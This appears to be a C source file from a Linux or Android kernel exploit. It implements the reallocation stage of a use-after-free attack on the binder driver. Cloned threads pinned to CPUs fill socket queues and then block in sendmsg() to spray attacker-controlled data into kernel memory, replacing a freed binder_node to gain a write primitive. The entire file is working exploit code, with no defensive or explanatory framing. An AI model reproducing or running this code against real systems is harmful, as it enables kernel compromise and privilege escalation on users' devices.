#define _GNU_SOURCE
#include <sched.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

#include "realloc.h"
#include "log.h"
#include "helpers.h"

struct realloc_thread {
   void *stack;
   pid_t pid;
   pthread_t th;
   bool evicted;
   size_t size;
   int cpu;
   int pair[2];
   int ctrl[2];
   pthread_barrier_t barrier;
};

uint8_t realloc_buffer[BUFSZ];

volatile struct realloc_thread threads[NREALLOC];


pthread_barrier_t realloc_barrier;

/*
 * This thread is in charge of reallocating the freed binder_node
 * with controlled data.
 */
void *realloc_thread(void *args)
{

   uint8_t buffer[BUFSZ + 1];
   struct realloc_thread *thread = (struct realloc_thread *)args;
   size_t size = thread->size;
   int cpu = thread->cpu;
	struct msghdr msg;
	struct iovec iov;
	memset(&iov, 0, sizeof(iov));
	memset(&msg, 0, sizeof(msg));

	pin_cpu(cpu);

	uint32_t pid = syscall(__NR_gettid);
	/* Exhaust the available socket window. */
	iov.iov_base = realloc_buffer;
	iov.iov_len = size;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);

	/* The next call will block. */
	msg.msg_control = realloc_buffer;
	msg.msg_controllen = size;

   /* Signal we have finished spawning. */

   thread->evicted = false;
   while (!thread->evicted) {

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting here for the signal to copy the buffer data. */
      pthread_barrier_wait(&thread->barrier);


      memcpy(buffer, realloc_buffer, size);
      *(uint64_t *)(buffer + 0x60) =  pid;
      msg.msg_control = buffer;
      msg.msg_controllen = size;

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting for the signal to block on the sendmsg syscall, and kmalloc() our
       * controlled data.
       */
      pthread_barrier_wait(&thread->barrier);
      syscall(__NR_sendmsg, thread->pair[0], &msg, 0);


      pthread_barrier_wait(&thread->barrier);

      /* And fill the socket queue once again. */
      while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);
   }

   /* Wait for the exit signal. */

   pthread_barrier_wait(&thread->barrier);

   return NULL;
}

/*
 * Wait on the barrier, which will ultimately make the threads enter the
 * `sendmsg()` syscall and allocate controlled data.
 */
void realloc_barrier_wait(void)
{
   int i;

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
         continue;
      pthread_barrier_wait(&threads[i].barrier);
   }
}

/*
 * Spawn all the threads used during the reallocation.
 */
void spawn_realloc_threads()
{
	memset(realloc_buffer, 'A', BUFSZ);
	*(uint32_t *)realloc_buffer = BUFSZ;
	*(uint32_t *)(realloc_buffer + 4) = 0; // set node->lock

	if (pthread_barrier_init(&realloc_barrier, NULL, NREALLOC + 1) < 0) {
		perror("pthread_barrier_init");
		exit(1);
	}

	int i;
	int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
	for (i = 0; i < NREALLOC; i++) {
		pid_t pid;
      void *stack = malloc(0x10000);
      threads[i].evicted = false;
      threads[i].size = BUFSZ;
      threads[i].cpu = i % ncpus;
      threads[i].stack = stack;

      if (pthread_barrier_init(&threads[i].barrier, NULL, 2) < 0) {
         log_err("[-] pthread_barrier_init: '%s'\n", strerror(errno));
         exit(1);
      }

      /* Create a socketpair. */
      if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, threads[i].pair) < 0) {
         perror("socketpair");
         pthread_exit(NULL);
      }

		pid = clone(realloc_thread, stack + 0x10000 - 8, CLONE_VM|CLONE_FILES|SIGCHLD, &threads[i]);
		if (pid < 0) {
			perror("clone");
			exit(1);
		}

      threads[i].pid = pid;

	}
}

/*
 * Setup the content of the buffer, whose content will be sprayed in kernel during the
 * `sendmsg()` call.
 */
void setup_realloc_buffer(void *content, size_t size)
{
   if (size <= 8)
      return;

   if (size > BUFSZ)
      size = BUFSZ;

   /* We need to skip the first 8 bytes, because otherwise, sendmsg will fail. */
   memcpy(realloc_buffer + 8, content + 8, size - 8);
	/* Unlock the realloc thread, let them copy the buffer. */
   realloc_barrier_wait();
}

/*
 * Discard a thread from the pool. We do this when we successfully replaced a `binder_node` with controlled
 * content, and this `binder_node` is subsequently used to trigger a write8, as the side effect of this is
 * to free (once again) the `binder_node`. As the realoc thread will keep a reference to the `binder_node` and
 * free it as well, we keep it blocking on `sendmsg()` for now, until we can clean that reference from the kernel
 * stack later on.
 */
bool discard_realloc_thread(pid_t pid)
{
   int i;

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].pid == pid) {
         threads[i].evicted = true;
         return true;
      }
   }

   return false;
}

/*
 * Make the threads exit their blocking `sendmsg()` call, and brace themselves before
 * being use once again to allocate controlled data in kernel land.
 */
void reset_realloc_threads()
{
   int i;
   uint8_t buf[0x1000];

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
         continue;
      while (recv(threads[i].pair[1], buf, 0x1000, MSG_DONTWAIT) > 0);
      pthread_barrier_wait(&threads[i].barrier);
   }
}

/*
 * We're done, kill the whole thread pool.
 */
void cleanup_realloc_threads()
{
	int i;
	/* Kill realloc threads. */
	for (i = 0; i < NREALLOC; i++) {
		int status;
      if (threads[i].evicted){
			continue;
      }
      kill(threads[i].pid, SIGKILL);
      close(threads[i].pair[0]);
      close(threads[i].pair[1]);

      //pthread_barrier_wait(&threads[i].barrier);  
	}
	int status;
	for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
			continue;
		waitpid(threads[i].pid, &status, 0);
      //pthread_join(threads[i].th, NULL);
      threads[i].pid = 0;
      free(threads[i].stack);
      threads[i].stack = 0;
	}
}



